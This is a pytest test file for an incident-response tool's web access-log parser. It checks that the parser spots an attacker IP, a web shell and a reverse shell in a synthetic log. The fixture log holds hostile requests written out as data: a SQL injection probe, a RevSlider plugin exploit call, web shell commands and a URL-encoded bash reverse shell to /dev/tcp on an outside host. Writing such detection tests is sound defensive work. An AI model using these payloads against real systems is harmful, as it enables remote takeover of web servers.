"""Web access-log adapter: detect the web attack, attacker IP, web shell, reverse shell."""

from __future__ import annotations

from linuxir.adapters import web

ATTACKER = "103.27.202.91"
_LOG = "\n".join([
    f'9.9.9.9 - - [14/Apr/2026:12:00:01 +0000] "GET / HTTP/1.1" 200 100 "-" "Mozilla/5.0"',
    f'{ATTACKER} - - [14/Apr/2026:18:04:57 +0000] "GET /search.php?q=%27%20UNION%20SELECT%201,2,3-- HTTP/1.1" 403 12 "-" "curl/7.88.1"',
    f'{ATTACKER} - - [14/Apr/2026:19:42:03 +0000] "POST /wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=update_plugin HTTP/1.1" 200 842 "-" "curl/7.88.1"',
    f'{ATTACKER} - - [14/Apr/2026:19:51:56 +0000] "GET /wp-content/uploads/2026/04/media-cache.php?x=id HTTP/1.1" 200 12 "-" "curl/7.88.1"',
    f'{ATTACKER} - - [14/Apr/2026:20:16:20 +0000] "GET /wp-content/uploads/2026/04/media-cache.php?x=bash%20-c%20%27bash%20-i%20%3E%26%2Fdev%2Ftcp%2F103.27.202.92%2F443%200%3E%261%27 HTTP/1.1" 200 0 "-" "curl/7.88.1"',
]) + "\n"


def _write(tmp_path):
    host = tmp_path / "WEB-01"
    host.mkdir()
    (host / "web_access.log").write_text(_LOG)
    return tmp_path


def test_identifies_attacker_and_webshell(tmp_path):
    out = web.parse_access([_write(tmp_path)])
    assert "CONFIRMED web-shell operator IP(s)" in out
    assert ATTACKER in out
    assert "media-cache.php" in out                 # web-shell invocation surfaced
    assert "/dev/tcp/103.27.202.92/443" in out       # reverse shell (url-decoded)


def test_signatures_flagged(tmp_path):
    out = web.parse_access([_write(tmp_path)])
    assert "revslider" in out.lower() or "plugin-exploit" in out
    assert "sqli" in out
    # benign mobile client is not promoted as an attacker
    assert "9.9.9.9: " not in out.split("Suspicious IPs")[1] if "Suspicious IPs" in out else True


def test_no_web_log(tmp_path):
    assert web.parse_access([tmp_path]).startswith("[no web access logs")
